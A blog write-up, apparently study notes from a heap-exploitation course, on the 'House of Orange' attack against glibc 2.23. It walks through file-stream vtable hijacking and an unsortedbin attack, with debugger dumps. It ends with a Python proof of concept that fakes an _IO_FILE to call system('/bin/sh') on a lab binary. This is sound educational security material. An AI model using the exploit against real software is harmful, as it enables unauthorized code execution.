---
layout: post
title:  "HeapLAB 1 - House of Orange"
date:   2022-12-07 20:02:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Background

This is a pretty modern technique, developed at 2016. \
It is especially useful in order to get a shell. 

Instead of the `malloc hooks`, it utilizes `file stream exploitation`, aka `FSOP`. 

This technique consists of 3 stages, which i will cover in reverse order. 

## Phase 3 - File Stream Exploitation

glibc implements wrappers, which called `file streams`, on top of file descriptors. \
The glibc functions, such as `fopen()`, uses file streams instead of file descriptors. 

This feature provides buffered I/O, undo, and more.

Their names are `typedef struct _IO_FILE FILE`.

In order to quickly inspect the struct:

```bash
start  # load dynamic libraries 
ptype /o struct _IO_FILE  # print struct along with offsets
dt FILE  # equivalent
```

```bash
pwndbg> dt FILE
FILE
    +0x0000 _flags               : int
    +0x0008 _IO_read_ptr         : char *
    +0x0010 _IO_read_end         : char *
    +0x0018 _IO_read_base        : char *
    +0x0020 _IO_write_base       : char *
    +0x0028 _IO_write_ptr        : char *
    +0x0030 _IO_write_end        : char *
    +0x0038 _IO_buf_base         : char *
    +0x0040 _IO_buf_end          : char *
    +0x0048 _IO_save_base        : char *
    +0x0050 _IO_backup_base      : char *
    +0x0058 _IO_save_end         : char *
    +0x0060 _markers             : struct _IO_marker *
    +0x0068 _chain               : struct _IO_FILE *
    +0x0070 _fileno              : int
    +0x0074 _flags2              : int
    +0x0078 _old_offset          : __off_t
    +0x0080 _cur_column          : short unsigned int
    +0x0082 _vtable_offset       : signed char
    +0x0083 _shortbuf            : char [1]
    +0x0088 _lock                : _IO_lock_t *
    +0x0090 _offset              : __off64_t
    +0x0098 _codecvt             : struct _IO_codecvt *
    +0x00a0 _wide_data           : struct _IO_wide_data *
    +0x00a8 _freeres_list        : struct _IO_FILE *
    +0x00b0 _freeres_buf         : void *
    +0x00b8 __pad5               : size_t
    +0x00c0 _mode                : int
    +0x00c4 _unused2             : char [20]
```

The file stream contains the underlying fd, `_fileno`, along with many `char *` buffers (can be used for buffering), `offset`, and more importantly - `_chain` - which is a pointer to the next file stream the process owns.

Each process have its all file streams linked together in a singly-linked non circular list. \
When a new file stream is generated, it is linked into the head of the linked list. 

The head of this list is called `_IO_list_all`, which type is `_IO_FILE_plus`. 

This type is a wrapper on the `struct _IO_FILE`, along with an added `vtable` ptr. 

The reason behind this vptr is to be compatible with the C++ `streambuf` class. 

Few notes: 

1. File streams are created on the heap

2. We can exploit binary even if it does not opens any `FILE` struct. This is because even `stdin, stdout, stderr` are actually file streams themselves. \
They are always present within the `.data` section of GLIBC. 

3. Our goal is to corrupt the `vtable` ptr of a file stream, or even inject a fake file stream (via the `_chain` member). 

## Phase 2 - Unsortedbin Attack

Utilizes the write primitive of the `unsortedbin attack` to write the arena address inside `_IO_file_all`, which is the head of the file streams linked list. 

This results with a fake file stream on the arena. \
The fake stream should have its `_chain` member repurpused as one of the bin's addresses - hence setting the next file stream as one of the bin's header chunk, which is a chunk we can write to. 

So by the end of this phase, we have constructed a secondary file stream that we can fully write into. 

## Phase 1 - 

Note that this phase may be skipped, if an adquate bug is found. 

### Binary

A sample binary, compiled with `glibc == 2.23`:

```bash
checksec
Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'../.glibc/glibc_2.23'
```

This binary enables allocation of small chunks, where `size == 0x20`, and large chunk, where `size == 0xfd0`.

There is an heap overflow that may be triggered to the first allocated small chunk. 

### free() via malloc()

Our goal is to populate the unsortedbin with certain free chunk, for Phase 2 of the attack to work.

However, note that this program has no calls to `free()`, only `malloc()`! \
How exactly can we free via malloc?

There is a very cool trick that allows doing exactly this. \
Recall that `House of Force` involved overwriting the `top_chunk` size to a very large value, that would allow huge allocation + small allocation to our target address. 

In a somewhat opposite manner, we can overwrite the `top_chunk` size field to some low value, triggering an edge case of `malloc` that causes an internal `free` call. 

So what happens in case the `top_chunk` isn't large enough to serve certain `malloc` request? \ 

In case of the `main_arena`, it invokes the `brk` syscall to request more memory from the kernel. \
Malloc then uses the `top_chunk->size` field to determine if the returned memory region is contigious to the end of the heap. \
If it is - malloc extends the top chunk into the new memory, and makes the allocation from the newly-larger `top_chunk`. 

If we would overwrite `top_chunk->size` field to some low value, the memory region returned by `brk` appears to malloc as non-contigious - because now it doesn't border with the end of the heap. \
Malloc assumes the kernel allocation has failed, and *starts a new heap at the new memory region returned by brk*. \
It first sets the original `top_chunk` to the new memory region, and *frees the old top chunk*. 

It means that if we overwrite the `top_chunk->size` to some low value, then request an allocation larger than this size, malloc would update the `top_chunk` and *generate a free chunk with our controlled size* - that can be used in an unsortedbin attack. 

## Full Exploitation

I've allocated a small chunk, used the heap overflow vuln to overwrite the `top_chunk->size` to `0x90` (so freeing it would move it to an unsortedbin), and allocated a large chunk to trigger the top chunk extension (as the requested size must be larger than `0x90`).

The following mitigation crashed the program:

```c
assert ((old_top == initial_top (av) && old_size == 0) ||
           ((unsigned long) (old_size) >= MINSIZE &&            prev_inuse (old_top) &&            
           ((unsigned long) old_end & (pagesize - 1)) == 0));
```

The first boolean expression is `false`, as `old_size != 0`.
The second boolean expression is `false`, due to few reasons:

1. There is an integritiy check that the `top_chunk->size >= MINSIZE`. \
This stands for the minimal chunk size, which is `0x20`, so this part is passed. 

2. The `PREV_INUSE` bit of the `top_chunk->size` must always be enabled. \
We can easily bypass this by setting the size to `0x91`, for example. 

3. There is an alignment check for the end of the heap address. \
This can be bypassed easily too, however note that it requires setting chunk size of about `~0x1000` bytes. 

After triggering the top chunk expansion, the following heap chunks are presented:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555603020
Size: 0xfc1
fd: 0x7ffff7dd4b78
bk: 0x7ffff7dd4b78

Allocated chunk
Addr: 0x555555603fe0
Size: 0x10

Allocated chunk | PREV_INUSE
Addr: 0x555555603ff0
Size: 0x11

Allocated chunk
Addr: 0x555555604000
Size: 0x00
```

Indeed, the top chunk of length `0xfc1` was freed to the unsortedbin. \
Moreover, the `top_chunk` is now allocated at a completely different heap:

```bash
pwndbg> top_chunk
Top chunk | PREV_INUSE
Addr: 0x555555624fd0
Size: 0x21031
```

Note that malloc added 3 more chunks, of sizes `0x10, 0x11, 0x00` - all at the original heap address space end. \
These are called `fencepost chunks`, and indicate that heap isn't valid anymore, and doesn't has any `top_chunk`. \
Their main purpose is to allow malloc to safely look forward two chunks, as needed by forward consolidation, without any access to unmapped memory. 

We can now use the unsortedbin attack, to overwrite arbitrary address to the value of the `unsortedbin head` within the `main_arena`. 

Our target address is `_IO_list_all`, which is the head of the file streams linked list. \
It means that after a successful partial unlinking, `*_IO_list_all = unsortedbin_arena_addr`, which means the `main_arena` would be treated as a file stream. 

Upon exiting a program, file streams invokes the following code snippet:

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
   #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
              || (_IO_vtable_offset (fp) == 0
                    && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                        > fp->_wide_data->_IO_write_base))
    #endif
            )
           && _IO_OVERFLOW (fp, EOF) == EOF)
```

We are mostly interested by the `_IO_OVERFLOW` macro, which internaly calls the `overflow` member of a file stream - a function pointer, where `fp` represents the file stream. 

Note the two checks that must pass, in order for  `_IO_OVERFLOW` to be called: 

```c
fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
```

(This checks if there is anything left to be written in this file stream's buffer, before exiting). 

Inspecting the fake io stream content (type `struct _IO_FILE_plus`):

```c
pwndbg> p *_IO_list_all
$7 = {
  file = {
    _flags = 1432506320,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x555555603020 "ZZZZZZZZ!",
    _IO_read_base = 0x7ffff7dd5510 "",
    _IO_write_base = 0x7ffff7dd4b88 <main_arena+104> " 0`UUU",
    _IO_write_ptr = 0x7ffff7dd4b88 <main_arena+104> " 0`UUU",
    _IO_write_end = 0x7ffff7dd4b98 <main_arena+120> "\210K\335\367\377\177",
    _IO_buf_base = 0x7ffff7dd4b98 <main_arena+120> "\210K\335\367\377\177",
    _IO_buf_end = 0x7ffff7dd4ba8 <main_arena+136> "\230K\335\367\377\177",
    _IO_save_base = 0x7ffff7dd4ba8 <main_arena+136> "\230K\335\367\377\177",
    _IO_backup_base = 0x7ffff7dd4bb8 <main_arena+152> "\250K\335\367\377\177",
    _IO_save_end = 0x7ffff7dd4bb8 <main_arena+152> "\250K\335\367\377\177",
    _markers = 0x7ffff7dd4bc8 <main_arena+168>,
    _chain = 0x7ffff7dd4bc8 <main_arena+168>,
    _fileno = -136492072,
    _flags2 = 32767,
    _old_offset = 140737351863256,
    _cur_column = 19432,
    _vtable_offset = -35 '\335',
    _shortbuf = <incomplete sequence \367>,
    _lock = 0x7ffff7dd4be8 <main_arena+200>,
    _offset = 140737351863288,
    _codecvt = 0x7ffff7dd4bf8 <main_arena+216>,
    _wide_data = 0x7ffff7dd4c08 <main_arena+232>,
    _freeres_list = 0x7ffff7dd4c08 <main_arena+232>,
    _freeres_buf = 0x7ffff7dd4c18 <main_arena+248>,
    __pad5 = 140737351863320,
    _mode = -136491992,
    _unused2 = "\377\177\000\000(L\335\367\377\177\000\000\070L\335\367\377\177\000"
  },
  vtable = 0x7ffff7dd4c38 <main_arena+280>
}
```

So `_mode` is indeed negative, and the first check passes. \
However, `fp->_IO_write_ptr == fp->_IO_write_base`, so the second check fails.

Note the address of the `_chain` member tho. \
In case the above check fails, glibc would continue to flush the next file stream, as denoted by the `_chain` member. 

```bash
pwndbg> p _IO_list_all.file._chain
$8 = (struct _IO_FILE *) 0x7ffff7dd4bc8 <main_arena+168>
pwndbg> p &_IO_list_all.file._chain
$9 = (struct _IO_FILE **) 0x7ffff7dd4be0 <main_arena+192>
pwndbg> dq &main_arena 26
00007ffff7dd4b20     0000000100000000 0000000000000000
00007ffff7dd4b30     0000000000000000 0000000000000000
00007ffff7dd4b40     0000000000000000 0000000000000000
00007ffff7dd4b50     0000000000000000 0000000000000000
00007ffff7dd4b60     0000000000000000 0000000000000000
00007ffff7dd4b70     0000000000000000 0000555555624fd0
00007ffff7dd4b80     0000000000000000 0000555555603020
00007ffff7dd4b90     00007ffff7dd5510 00007ffff7dd4b88
00007ffff7dd4ba0     00007ffff7dd4b88 00007ffff7dd4b98
00007ffff7dd4bb0     00007ffff7dd4b98 00007ffff7dd4ba8
00007ffff7dd4bc0     00007ffff7dd4ba8 00007ffff7dd4bb8
00007ffff7dd4bd0     00007ffff7dd4bb8 00007ffff7dd4bc8
00007ffff7dd4be0     00007ffff7dd4bc8 00007ffff7dd4bd8
```

It means the content of the address `0x00007ffff7dd4be0` determines the next file stream address. 

Note, however, that *this memory address on the main arena serves as the 0x60 smallbin bk pointer*!

It means that instead of overwriting the `top_chunk` with size of `0x20`, to perform an exact fit with the requested `malloc(0x18)` (hence making allocation from the unsortedbin), we would like to overwrite its size to `0x61`, thus not performing allocation from the unsortedbin but sorting it towards the `smallbin[0x60]`!

That way, `smallbin[0x60]->bk`, which is exactly `_chain`, would point toward our controlled chunk on the heap - allowing us to fully control its file stream struct. \
This would allow us to provide our own `vtable` and ventries, as we contol the chunk's content on the heap. 

Note that for this secondary stream we want to make sure both checks are passed, so the `overflow` would be called. 

We can store the `__overflow` content at the last 8 bytes of: `_unused2[20]`. \
We will also point the `vtable` (that we control) so that `vtable->__overflow` would be exactly the heap address where we stored `__overflow`. 

`vtable` type is `struct _IO_jump_t`:

```bash
pwndbg> dt "struct _IO_jump_t"
struct _IO_jump_t
    +0x0000 __dummy              : size_t
    +0x0008 __dummy2             : size_t
    +0x0010 __finish             : _IO_finish_t
    +0x0018 __overflow           : _IO_overflow_t
    +0x0020 __underflow          : _IO_underflow_t
    +0x0028 __uflow              : _IO_underflow_t
    +0x0030 __pbackfail          : _IO_pbackfail_t
    +0x0038 __xsputn             : _IO_xsputn_t
    +0x0040 __xsgetn             : _IO_xsgetn_t
    +0x0048 __seekoff            : _IO_seekoff_t
    +0x0050 __seekpos            : _IO_seekpos_t
    +0x0058 __setbuf             : _IO_setbuf_t
    +0x0060 __sync               : _IO_sync_t
    +0x0068 __doallocate         : _IO_doallocate_t
    +0x0070 __read               : _IO_read_t
    +0x0078 __write              : _IO_write_t
    +0x0080 __seek               : _IO_seek_t
    +0x0088 __close              : _IO_close_t
    +0x0090 __stat               : _IO_stat_t
    +0x0098 __showmanyc          : _IO_showmanyc_t
    +0x00a0 __imbue              : _IO_imbue_t
```

Where `__overflow` is the function pointer we would like to override. 

Also note that because the first stream does not passes the sanity checks, the secondary stream that is stored on the heap is being interpreted as `_IO_FILE_plus`, so it has a `vtable`. 

An example secondary stream (on the heap, passes the integrity checks):

```bash
pwndbg> p *(struct _IO_FILE_plus*)_IO_list_all.file._chain
$8 = {
  file = {
    _flags = 1852400175,
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>,
    _IO_read_end = 0x7ffff7dd4bc8 <main_arena+168> "\270K\335\367\377\177",
    _IO_read_base = 0x7ffff7dd4bc8 <main_arena+168> "\270K\335\367\377\177",
    _IO_write_base = 0x4141414141414140 <error: Cannot access memory at address 0x4141414141414140>,
    _IO_write_ptr = 0x4141414141414141 <error: Cannot access memory at address 0x4141414141414141>,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x0,
    _offset = 0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 12 times>, "\060\250\247\367\377\177\000"
  },
  vtable = 0x5555556030d8
}
```

And its `vtable`:

```bash
pwndbg> p *((struct _IO_FILE_plus*)(_IO_list_all.file._chain)).vtable
$14 = {
  __dummy = 0,
  __dummy2 = 0,
  __finish = 0x0,
  __overflow = 0x7ffff7a7a830 <__libc_system>,
  __underflow = 0x5555556030d8,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
```

Recall that when `__overflow` is called, its first argument is the address of the file stream, `fp`. \
This means that in case we override `__overflow` to `system`, we should make sure the first 8 bytes of the file stream (its `flags` member) contains `/bin/sh\x00`. \
That way, we get a shell without any one-gadget. 

Note that on `glibc < 2.27`, even the `abort` function flushes IO streams! \
It means that even if malloc mitigations are detected (and they do, as we have sorted the unsortedbin chunk and not exact-allocated it, so we've continued the search with the corrupted `bk`) - the IO streams handlers would be called, dropping us a shell!

Full POC:

```python
# Request a small chunk to overflow from.
small_malloc() # size 0x20

# Overflow the small chunk into the top chunk size field.
# Shrink the top chunk size field so it can be exhausted by a large request.
# Ensure the top chunk ends on a page boundary and has the prev_inuse bit set.
new_heap_size = 0x1000 - 0x20 + 1
edit(b"X"*24 + p64(new_heap_size))

# Request a large chunk to exhaust the top chunk and trigger top extension code.
# The old top chunk is non-contiguous to the new memory so the new memory becomes the
# top chunk and the old top chunk is freed.
large_malloc() # This chunk will be allocated from the new top chunk.


# =-=-=- PREPARE A FAKE _IO_FILE STRUCT -=-=-=

# Set up an unsortedbin attack and fake _IO_FILE struct.
flags = b"/bin/sh\x00"
size = 0x61
fd = 0x00
bk = libc.sym._IO_list_all - 16

write_base = 0x4141414141414140
write_ptr = 0x4141414141414141
mode = 0
vtable_ptr = heap + 0xd8
overflow = libc.sym.system

# Note that these write_base,ptr,mode are required to pass the checks for the secondary stream, which is forged at the heap (and not the arena like the first stream).
# It means that this memory is actually both 0x61 size chunk that was tearned-off the unsortedbin into the smallbin, and both a stream
fake_io_file = flags + p64(size) +\
        p64(fd) + p64(bk) +\
        p64(write_base) + p64(write_ptr) +\
        p64(0)*18 + p32(mode) + p32(0) +\
        p64(0) + p64(overflow) + p64(vtable_ptr)

edit(b"X"*16 + fake_io_file)

small_malloc()

```

## Key Notes

1. The first phase (that generates a free chunk within the unsortedbin) may be omitted, in case we can overwrite unsortedbin metadata. \
In case there are free chunks available, we can skip this part. 

2. The top chunk expansion trick (triggering free via malloc) only works on the main arena. \
On other arenas, their top chunk size doesn't determine whether newly returned memory by `brk` is contiguous. 

3. The exploit isn't 100% reliable. \
This is because of the `_mode` field of the first stream, that resides within the arena. It repurpused as the LSB of the `0xc0` smallbin, hence its MSB bit (that determins its negativity) is subject to ASLR. 

4. During phase 3: if only `0x60` bins allocations are possible, we can set the top chunk size to `0x69`. This identifies the chunk as *non-exact-fit*, while it is still sorted into the `0x60` smallbin. \
Another option is to set the size to `0xb1`, causing return to the `main_arena` when treated as a `_chain` pointer, so that the `smallbin[0xb0]` overlaps the file stream's `_chain` pointer.
